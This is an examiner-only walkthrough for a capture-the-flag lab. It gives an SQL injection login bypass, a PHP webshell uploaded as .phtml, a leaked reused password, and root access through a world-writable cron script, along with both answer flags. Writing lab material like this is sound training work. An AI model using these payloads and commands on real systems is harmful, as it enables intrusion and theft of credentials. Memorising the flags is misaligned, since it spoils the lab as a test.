# m2-webwork — walkthrough (EXAMINER ONLY)

Level: easy-medium. Skills: web enum, SQLi auth bypass, upload-filter bypass,
credential reuse, world-writable cron privesc.

## 1. Enumerate
```bash
nmap -sC -sV <IP>            # 22 ssh, 80 http (Apache/PHP)
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
#   /admin   /uploads
```

## 2. SQLi login bypass
Login at `http://<IP>/admin/`. The query is
`... WHERE username='$u' AND password='$p'` with no sanitisation.
```
username:  admin' -- -
password:  anything
```
→ authenticated, redirected to `panel.php`.

## 3. Upload-filter bypass → webshell
`panel.php` blocks only `php/php4/php5`. Apache is configured to execute
`.phtml` as PHP. Create `shell.phtml`:
```php
<?php system($_GET['c']); ?>
```
Upload it, then:
```bash
curl "http://<IP>/uploads/shell.phtml?c=id"      # www-data
```
(Or upload a reverse shell and catch with `nc -lvnp 4444`.)

## 4. Creds from config → user
```bash
curl "http://<IP>/uploads/shell.phtml?c=cat%20/var/www/html/admin/config.php"
#   $DB_PASS = 'Summer#Breeze88'
```
That password is reused by the system user `webdev`:
```bash
ssh webdev@<IP>        # Summer#Breeze88
cat /home/webdev/user.txt
# FLAG{upl04d_t0_w3bsh3ll_w1n}                    <-- USER FLAG
```

## 5. Privesc — world-writable root cron
```bash
cat /etc/cron.d/webbackup          # * * * * * root /opt/scripts/backup.sh
ls -l /opt/scripts/backup.sh       # -rwxrwxrwx  (world-writable!)

echo 'chmod +s /bin/bash' > /opt/scripts/backup.sh
# wait up to 60s for cron, then:
/bin/bash -p
# id -> euid=0
cat /root/root.txt
# FLAG{cr0n_w0rld_wr1t4bl3_pwn}                   <-- ROOT FLAG
```
